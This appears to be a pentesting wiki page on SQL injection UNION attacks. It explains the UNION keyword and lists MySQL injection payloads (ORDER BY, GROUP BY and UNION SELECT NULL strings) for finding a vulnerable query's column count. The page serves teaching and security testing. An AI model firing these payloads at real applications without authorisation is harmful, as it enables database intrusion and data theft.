# UNION Attacks

## Theory

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example: 
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
  
This SQL query will return a single result set with two columns, containing values from columns **a** and **b** in **table1** and columns **c** and **d** in **table2**. 

## Practice

### Finding number of columns
We first need to know the number of columns in order to append data.
{% tabs %}
{% tab title="MySQL" %}
Using `order by`
```sql
1' ORDER BY 1--+	#True
1' ORDER BY 2--+	#True
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```
  
Using `group by`
```sql
1' GROUP BY 1--+	#True
1' GROUP BY 2--+	#True
1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```

Using `UNION SELECT`. It only works if error showing is enabled
```sql
' UNION SELECT NULL--            #The used SELECT statements have a different number of columns
' UNION SELECT NULL,NULL--       #The used SELECT statements have a different number of columns
' UNION SELECT NULL,NULL,NULL--  #No error means query uses 3 column
```
{% endtab %}
{% endtabs %}


## Resources

{% embed url="https://portswigger.net/web-security/sql-injection" %}
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}